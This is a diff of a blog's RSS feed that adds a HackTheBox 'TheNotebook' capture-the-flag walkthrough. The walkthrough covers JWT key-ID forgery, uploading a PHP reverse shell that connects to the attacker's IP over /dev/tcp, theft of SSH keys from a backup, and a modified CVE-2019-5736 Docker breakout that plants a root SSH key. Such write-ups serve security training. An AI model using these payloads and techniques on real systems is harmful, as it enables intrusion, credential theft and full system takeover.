@@ -8,6 +8,365 @@
     <lastBuildDate>Sat, 07 Aug 2021 21:07:15 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/jwt/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - TheNotebook</title>
+      <link>https://fahmifj.github.io/hackthebox/thenotebook/</link>
+      <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/thenotebook/</guid>
+      <description>Abusing JWT key identifier and breaking out of a Docker container</description>
+      <content:encoded><![CDATA[<p>TheNotebook from Hack The Box hosts a web-based note application and it uses a JWT token for its authentication cookie. The token can be forged to escalate myself to admin. With admin-level access, it is possible to drop a PHP web shell using the upload functionality, resulting in shell access to the system. Enumerating on the system discovers a backup file that contains SSH keys of a user. The user is allowed run a Docker container with <code>sudo</code> permissions. The Docker version in this machine is vulnerable to CVE-2019-5736. Along with the <code>sudo</code> permissions, the Docker vulnerability can be exploited to gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>JWT Key ID</li>
+<li>Docker breakout using CVE-2019-573</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li><a href="https://jwt.io">https://jwt.io</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan discovers two open ports, SSH on port 22 and a NGINX web server on port 80.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ fscan 10.10.10.230 thenotebook
+nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.230 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p22,80,10010 -sC -sV -oA nmap/10-tcp-allport-thenotebook 10.10.10.230
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-07 02:29 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.230
+Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: The Notebook - Your Note Keeper
+10010/tcp filtered rxapi
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.67 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>On port 80, the machine hosts a web application called &ldquo;The Notebook&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210807133719995.png" alt="image-20210807133719995"  /></div>
+</p>
+<p>I tried some default credentials on the login page, but no luck, so I will just register an account.</p>
+<p><div class="img-container"><img src="imgs/image-20210807134833301.png" alt="image-20210807134833301"  /></div>
+</p>
+<p>And the site automatically logs me in.</p>
+<p><div class="img-container"><img src="imgs/image-20210807135132964.png" alt="image-20210807135132964"  /></div>
+</p>
+<p>I can create a note on <code>/notes</code>. I will setup a Python web server and I add a note that contains my HTB IP. Unfortunately, there is no incoming request on my web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210807135517614.png" alt="image-20210807135517614"  /></div>
+</p>
+<p>My note has link of <code>10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/8</code>. Because the second path looks like a GUID which is unique, so I think the attack is not an IDOR.</p>
+<p>Although, I said it&rsquo;s not an IDOR, I have a cool trick to share:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ curl -sI 10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/<span class="o">{</span>7..8<span class="o">}</span>
+HTTP/1.1 <span class="m">401</span> UNAUTHORIZED
+Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:48 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: <span class="m">12</span>
+Connection: keep-alive
+
+HTTP/1.1 <span class="m">200</span> OK
+Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:49 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: <span class="m">1710</span>
+Connection: keep-alive
+</code></pre></div><h4 id="gobuster">Gobuster</h4>
+<p>Running a <code>gobuster</code> scan reveals that there is an admin page (<code>/admin</code>), but I have no access there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ gobuster dir -u http://10.10.10.230/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x txt -o gobuster/gobuster-S-80 -t <span class="nv">40</span> 
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.230/
+<span class="o">[</span>+<span class="o">]</span> Method:                  GET
+<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Extensions:              txt
+<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/08/07 02:44:26 Starting gobuster in directory enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9<span class="o">]</span>
+/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250<span class="o">]</span>
+/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.230/<span class="o">]</span>
+/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422<span class="o">]</span>                          
+                                                                          
+<span class="o">===============================================================</span>
+2021/08/07 02:44:49 <span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</code></pre></div><h4 id="playing-with-jwt-cookie">Playing with JWT Cookie</h4>
+<p>While inspecting the browser storage, I find the site generates two cookie:  <code>auth</code> and <code>uuid</code>. The <code>auth</code> cookie is a JWT token.</p>
+<p><div class="img-container"><img src="imgs/image-20210807141947185.png" alt="image-20210807141947185"  /></div>
+</p>
+<blockquote>
+<p>Note: JWT token consists of header, payload, and signature that are separated by a dot and each part is encoded with base64.</p>
+</blockquote>
+<p>The <code>auth</code> cookie can decoded using <a href="https://jwt.io/">jwt.io</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210807143329934.png" alt="image-20210807143329934"  /></div>
+</p>
+<p>The value of <code>kid</code> (key identifier) and <code>admin_cap</code> are interesting vectors to play with. First, I will grab the header value and decode it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
+$ <span class="nb">echo</span> <span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9&#39;</span> <span class="p">|</span> base64 -d
+<span class="o">{</span><span class="s2">&#34;typ&#34;</span>:<span class="s2">&#34;JWT&#34;</span>,<span class="s2">&#34;alg&#34;</span>:<span class="s2">&#34;RS256&#34;</span>,<span class="s2">&#34;kid&#34;</span>:<span class="s2">&#34;http://localhost:7070/privKey.key&#34;</span><span class="o">}</span>
+</code></pre></div><p>I can try to modify the <code>kid</code> value to point to my IP, then I will encode the header back to base64.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
+$ <span class="nb">echo</span> -n <span class="s1">&#39;{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;RS256&#34;,&#34;kid&#34;:&#34;http://10.10.14.17/privKey.key&#34;}&#39;</span> <span class="p">|</span> base64 -w0
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNy9wcml2S2V5LmtleSJ9
+</code></pre></div><p>I will put back the forged header to the <code>auth</code> cookie and setup a Python web server afterwards.</p>
+<p>When I refresh the page, there is an incoming request for <code>privKey.key</code> to my web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210807151313793.png" alt="image-20210807151313793"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="escalate-to-web-admin">Escalate to web admin</h4>
+<p>Since the  <code>kid</code>  value can be controlled by me, I can forge a token that has <code>admin_cap</code>  value set to <code>true</code> and so the app will look for my private key and eventually validates my forged token using that key.</p>
+<p>First, I will create <code>privKey.key</code> using <code>ssh-keygen</code>. I will host this key using Python web server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
+$ ssh-keygen -t rsa -P <span class="s2">&#34;&#34;</span> -b <span class="m">4096</span> -m PEM -f privKey.key
+Generating public/private rsa key pair.
+Your identification has been saved in privKey.key
+Your public key has been saved in privKey.key.pub
+The key fingerprint is:
+SHA256:IWMd7YYOw6gQT2tpGCtbx3Iaav2yW1qs8lyYGVl90fo kali@kali
+The key<span class="err">&#39;</span>s randomart image is:
++---<span class="o">[</span>RSA 4096<span class="o">]</span>----+
+<span class="p">|</span>        .o.      <span class="p">|</span>
+<span class="p">|</span>o .   .. .o.     <span class="p">|</span>
+<span class="p">|</span> B + ++.o+.      <span class="p">|</span>
+<span class="p">|</span><span class="o">=</span> X B.+oooo      <span class="p">|</span>
+<span class="p">|</span>.B.X   +S..      <span class="p">|</span>
+<span class="p">|</span>o.o.*   .  E     <span class="p">|</span>
+<span class="p">|</span>.  +.<span class="o">=</span>           <span class="p">|</span>
+<span class="p">|</span> ...*.           <span class="p">|</span>
+<span class="p">|</span>  oB+            <span class="p">|</span>
++----<span class="o">[</span>SHA256<span class="o">]</span>-----+
+</code></pre></div><p>I will head to <a href="https://jwt.io/">jwt.io</a> to forge a new token and sign it using my <code>privKey.key</code>, and I will put this forged token to the <code>auth</code> cookie.</p>
+<p><div class="img-container"><img src="imgs/image-20210807152924854.png" alt="image-20210807152924854"  /></div>
+</p>
+<p>When I refresh the browser, a new menu called &ldquo;Admin Panel&rdquo; pops up.</p>
+<p><div class="img-container"><img src="imgs/image-20210807153522086.png" alt="image-20210807153522086"  /></div>
+</p>
+<p>Clicking the Admin Panel points to <code>/admin</code> where I see two options there: <code>View Notes</code> and <code>Upload File</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154045797.png" alt="image-20210807154045797"  /></div>
+</p>
+<p>The <code>View Notes</code> button links to <code>/admin/viewnotes</code>, and in this page all users' note can be viewed by the admin.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154240999.png" alt="image-20210807154240999"  /></div>
+</p>
+<p>Two interesting notes created by the admin are titled: <code>Need to fix config</code> and <code>Backups are scheduled</code>.  The first note contains information about a security issue.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154529651.png" alt="image-20210807154529651"  /></div>
+</p>
+<p>The second note states that the server has regular backups set.</p>
+<p><div class="img-container"><img src="imgs/image-20210807154537751.png" alt="image-20210807154537751"  /></div>
+</p>
+<p>The <code>File Upload</code> button points to <code>/admin/upload</code>. This page provides an upload functionality.</p>
+<p><div class="img-container"><img src="imgs/image-20210807160019742.png" alt="image-20210807160019742"  /></div>
+</p>
+<h4 id="web-shell-upload">Web Shell Upload</h4>
+<p>According to the note titled with <code>Need to fix config</code>, I will try to drop the following PHP code on the upload page.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ <span class="nb">echo</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; iamf-test.php 
+</code></pre></div><p>And the file gets uploaded.</p>
+<p><div class="img-container"><img src="imgs/image-20210807163411701.png" alt="image-20210807163411701"  /></div>
+</p>
+<p>The uploaded file can be accessed at <code>http://10.10.10.230/48101bbdd897877cc62b8704a293a436.php</code>. When I visit the link, it processes the PHP code.</p>
+<p><div class="img-container"><img src="imgs/image-20210807163428110.png" alt="image-20210807163428110"  /></div>
+</p>
+<p>I will change the payload with the following PHP reverse shell and then setup a netcat listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.17/53 0&gt;&amp;1&#39;&#34;</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>When I get the file URL, I will use <code>curl</code> to trigger the reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ curl -s http://10.10.10.230/11ee6b411f33fe8f9c49d1a02e5720b7.php
+</code></pre></div><p>Now on my listener, I have an interactive shell access as <code>www-data</code> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.17<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230<span class="o">]</span> <span class="m">39698</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1294<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@thenotebook:~/html$ 
+</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I will upgrade my shell to fully interactive one.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ which script
+which script
+/usr/bin/script
+www-data@thenotebook:~/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@thenotebook:~/html$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> suspended  nc -nvlp <span class="m">53</span>
+→ kali@kali «thenotebook» «10.10.14.17» 
+$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">5987</span> continued  nc -nvlp <span class="m">53</span>
+
+www-data@thenotebook:~/html$ stty rows <span class="m">30</span> cols <span class="m">106</span>
+www-data@thenotebook:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-noah">Shell as noah</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Based on the previous admin notes, I start with enumeration of readable file that contains &ldquo;backup&rdquo; string. One that stands out is <code>/var/backups/home.tar.gz</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@thenotebook:~/html$ find / -type f -readable 2&gt;/dev/null <span class="p">|</span> grep -i <span class="s2">&#34;backup&#34;</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+/var/backups/home.tar.gz
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>I will grab that file to my attacking machine. The file contains an SSH private key for user <code>noah</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.17» 
+$ tar -zxvf home.tar.gz
+home/
+home/noah/
+home/noah/.bash_logout
+home/noah/.cache/
+home/noah/.cache/motd.legal-displayed
+home/noah/.gnupg/
+home/noah/.gnupg/private-keys-v1.d/
+home/noah/.bashrc
+home/noah/.profile
+home/noah/.ssh/
+home/noah/.ssh/id_rsa
+home/noah/.ssh/authorized_keys
+home/noah/.ssh/id_rsa.pub
+</code></pre></div><h4 id="ssh---noah">SSH - noah</h4>
+<p>With the obtained private key, I can SSH login as <strong>noah</strong> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ ssh -i loot/home/noah/.ssh/id_rsa noah@10.10.10.230
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+  System information as of Sat Aug  <span class="m">7</span> 09:57:29 UTC <span class="m">2021</span>
+
+  System load:  0.03              Processes:              <span class="m">184</span>
+  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">0</span>
+  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
+  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+Last login: Wed Feb <span class="m">24</span> 09:09:34 <span class="m">2021</span> from 10.10.14.5
+noah@thenotebook:~$ id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span>
+</code></pre></div><p>User flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ cat user.txt <span class="p">|</span> sed -s <span class="s1">&#39;s/[a-f]/\*/g&#39;</span>
+*881626900**9*271**710*266*9427*
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>User <strong>noah</strong> is allowed to run an interactive command and shell to a container called <code>webapp-dev01</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo -l
+Matching Defaults entries <span class="k">for</span> noah on thenotebook:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User noah may run the following commands on thenotebook:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01*
+</code></pre></div><p>And the currently installed docker is vulnerable to CVE-2019-5736. More details about the vulnerability can be read <a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">here</a>.</p>
+<pre tabindex="0"><code>noah@thenotebook:~$ docker version
+Client:
+ Version:           18.06.0-ce
+ API version:       1.38
+ Go version:        go1.10.3
+ Git commit:        0ffa825
+ Built:             Wed Jul 18 19:09:54 2018
+ OS/Arch:           linux/amd64
+ Experimental:      false
+Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.38/version: dial unix /var/run/docker.sock: connect: permission denied
+</code></pre><h4 id="docker-breakout-cve-2019-5736">Docker Breakout CVE-2019-5736</h4>
+<p>To exploit the docker CVE-2019-5736, I will be using this <a href="https://github.com/Frichetten/CVE-2019-5736-PoC.git">PoC</a> by Frichetten. The exploit&rsquo;s author also gives a nice writeup about what the exploit does.</p>
+<p>I will clone the PoC to my working directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
+$ git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
+Cloning into <span class="s1">&#39;CVE-2019-5736-PoC&#39;</span>...
+remote: Enumerating objects: 45, <span class="k">done</span>.
+remote: Total <span class="m">45</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">45</span>
+Receiving objects: 100% <span class="o">(</span>45/45<span class="o">)</span>, 1.69 MiB <span class="p">|</span> 254.00 KiB/s, <span class="k">done</span>.
+Resolving deltas: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
+</code></pre></div><p>In the <code>main.go</code>, I will modify the payload variable with a bash script that will inject my SSH public key to root&rsquo;s <code>authorized_keys</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n mkdir -p /root/.ssh/ &amp;&amp; echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39; &gt; /root/.ssh/authorized_keys&#34;</span>
+</code></pre></div><p>I will compile the PoC and host it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «CVE-2019-5736-PoC» «10.10.14.17» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ go build -o breakout main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
+Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</code></pre></div><p>On TheNotebook, I will have two SSH sessions. On the first SSH session, I will use it to download and execute the exploit within the container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 bash
+root@0f4c2517af40:/opt/webapp# wget -q 10.10.14.17:8080/breakout <span class="o">&amp;&amp;</span> chmod +x breakout
+root@0f4c2517af40:/opt/webapp# ./breakout
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+</code></pre></div><p>Then on the second session, I will run the sudo command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 /bin/sh
+</code></pre></div><p>But then, on the container session, I get the following error:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@0f4c2517af40:/opt/webapp# ./breakout
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">17638</span>
+<span class="o">[</span>+<span class="o">]</span> Found the PID: self
+strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax
+</code></pre></div><p>To resolve that, at line 42 of the <code>main.go</code> file, I will add another condition to ignore PID with name &ldquo;self&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
+	<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
+	<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Added by me
+</span><span class="c1"></span>			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+			<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+				<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+				<span class="k">return</span>
+			<span class="p">}</span>
+		<span class="p">}</span> <span class="c1">// end
+</span><span class="c1"></span>	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>I will re-compile the exploit and transfer it again to the container, and this time it works!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@c8cf4072ca26:/opt/webapp# ./breakout 
+<span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
+<span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">1729</span>
+<span class="o">[</span>+<span class="o">]</span> Getting file handle
+<span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
+<span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc000444000<span class="o">}</span>
+root@c8cf4072ca26:/opt/webapp# 
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210807220201808.png" alt="image-20210807220201808"  /></div>
+</p>
+<blockquote>
+<p>Pay attention to <code>bash</code> and <code>/bin/sh</code></p>
+</blockquote>
+<h4 id="ssh---root">SSH - Root</h4>
+<p>Now I can SSH login as root using my own private keys.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»  
+$ ssh root@10.10.10.230
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+  System load:  0.1               Processes:              <span class="m">190</span>
+  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">1</span>
+  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
+  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
+
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+Last login: Fri Jul <span class="m">23</span> 14:27:18 <span class="m">2021</span>
+root@thenotebook:~# 
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/</a></li>
+<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - TheNotebook</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-thenotebook/</link>
       <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
       
@@ -361,6 +720,581 @@ root@thenotebook:~#
 <ul>
